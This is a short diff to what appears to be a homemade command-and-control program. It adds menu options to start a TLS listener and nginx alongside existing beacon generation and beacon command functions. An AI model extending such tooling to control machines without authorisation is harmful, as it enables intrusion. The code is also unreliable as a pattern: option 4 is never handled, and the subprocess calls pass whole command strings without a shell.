@@ -1,3 +1,5 @@
+import subprocess
+
 import Functemplates
 import os
 import sys
@@ -89,10 +91,22 @@ def SendCommand():
     print(f'{result}')
 
 
+def startListener():
+    subprocess.Popen('tls-listener.py', close_fds=True)
+
+def startMTLS():
+    subprocess.Popen('systemctl start nginx', close_fds=True)
+
+
 if __name__ == '__main__':
     while 1:
-        choice = input("Generate a new beacon (1) or interact with beacons (2) > ")
+        choice = input("Generate a new beacon (1) "
+                       "or interact with beacons (2) "
+                       "or start listeners (3) "
+                       "or run nginx (4) > ")
         if choice == '1':
             BobTheBuilder()
         if choice == '2':
             SendCommand()
+        if choice == '3':
+            startListener()
